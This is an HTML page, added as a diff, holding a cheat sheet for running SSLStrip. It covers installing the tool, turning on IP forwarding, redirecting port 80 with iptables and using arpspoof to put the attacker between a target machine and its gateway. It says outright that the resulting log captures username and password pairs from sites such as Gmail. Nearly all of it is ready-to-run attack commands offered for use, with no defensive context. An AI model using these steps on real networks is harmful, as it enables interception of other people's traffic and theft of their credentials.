@@ -1,0 +1,75 @@
+<HTML>
+<PRE>
+
+Just Like Farengi - We Like to BE PREPARED:
+
+# SSLStrip CHEATSHEET
+
+OVERVIEW:
+
+Requirements
+
+    * Python >= 2.4 (apt-get install python)
+    * The python "twisted-web" module (apt-get install twisted-web)
+
+Setup
+
+    * tar zxvf sslstrip-0.5.tar.gz
+    * cd sslstrip-0.5
+    * (optional) sudo python ./setup.py install
+
+Running sslstrip
+
+    * Flip your machine into forwarding mode. (echo "1" > /proc/sys/net/ipv4/ip_forward)
+    * Setup iptables to redirect HTTP traffic to sslstrip.
+(iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <listenPort>)
+    * Run sslstrip. (sslstrip.py -l <listenPort>)
+    * Run arpspoof to convince a network they should send their traffic to you. (arpspoof -i <interface> -t <targetIP> <gatewayIP>)
+
+Thanks to Moxie MarlinSpike
+
+https://www.blackhat.com/html/bh-dc-09/bh-dc-09-speakers.html#Marlinspike
+
+STEP X STEP (for those who need it slower):
+
+# Proxy Preparation
+
+    * First verify routing and nat;
+
+    # cat /proc/sys/net/ipv4/ip_forward
+
+    * 0
+
+    # echo 1 > /proc/sys/net/ipv4/ip_forward
+
+    # cat /proc/sys/net/ipv4/ip_forward
+
+    * 1
+
+    # /sbin/iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+# Start MITM
+
+    * Arpspoof addresses to default interface gateway (and target machine)
+
+     # arpspoof -i eth0 -t 192.168.1.231 192.168.1.244
+
+# SSL Strip
+
+    * Start SSLStrip:
+
+    # ./sslstrip -l 8080
+
+* Open Browser  -  Go Login to SSL https://Gmail.com (for instance)
+
+# tail -f sslstrip.log
+
+You will log the name:password pairs for each site visited from the proxy.
+
+As you can see, the default gateway and target machine can be seasoned to taste.
+
+./sslstrip -h
+
+------------------------------------end SHEETCHEAT
+</html>
+</pre>
